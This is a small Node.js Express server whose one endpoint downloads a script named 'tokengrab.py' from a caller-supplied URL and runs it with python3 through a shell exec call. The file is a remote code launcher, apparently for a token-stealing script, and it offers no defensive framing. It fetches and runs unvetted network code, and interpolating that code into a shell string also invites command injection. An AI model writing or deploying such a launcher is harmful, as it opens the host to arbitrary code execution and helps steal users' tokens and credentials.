const express = require('express');
const fetch = require('node-fetch');
const { exec } = require('child_process');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

// Endpoint to execute tokengrab.py from GitHub
app.post('/run-tokengrab', async (req, res) => {
    const { githubUrl } = req.body;

    if (!githubUrl) {
        return res.status(400).json({ error: 'GitHub URL is required' });
    }

    try {
        // Download tokengrab.py from GitHub
        const response = await fetch(githubUrl);
        if (!response.ok) {
            throw new Error('Failed to download tokengrab.py');
        }

        const script = await response.text();

        // Save tokengrab.py locally (optional)

        // Execute tokengrab.py
        exec(`python3 -c "${script}"`, (err, stdout, stderr) => {
            if (err) {
                console.error('Error executing tokengrab.py:', err);
                return res.status(500).json({ error: 'Error executing tokengrab.py' });
            }
            console.log('tokengrab.py executed successfully:', stdout);
            res.json({ message: 'tokengrab.py executed successfully' });
        });

    } catch (error) {
        console.error('Error in /run-tokengrab:', error.message);
        res.status(500).json({ error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
});
